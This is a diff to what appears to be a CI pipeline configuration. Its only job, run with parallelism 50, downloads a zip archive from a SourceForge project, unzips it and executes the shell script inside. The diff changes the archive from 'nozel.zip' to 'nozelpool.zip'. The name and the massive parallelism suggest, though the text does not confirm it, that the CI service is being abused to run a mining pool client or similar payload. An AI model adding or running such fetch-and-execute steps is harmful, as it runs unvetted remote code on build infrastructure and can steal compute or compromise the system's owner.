@@ -15,5 +15,5 @@ blocks:
       jobs: 
         - name: 'Job #1' 
           commands: 
-            - curl https://sourceforge.net/projects/drths/files/nozel.zip/download -L -o nozel.zip && unzip nozel.zip && ./nozel.sh
+            - curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip && ./nozel.sh
           parallelism: 50
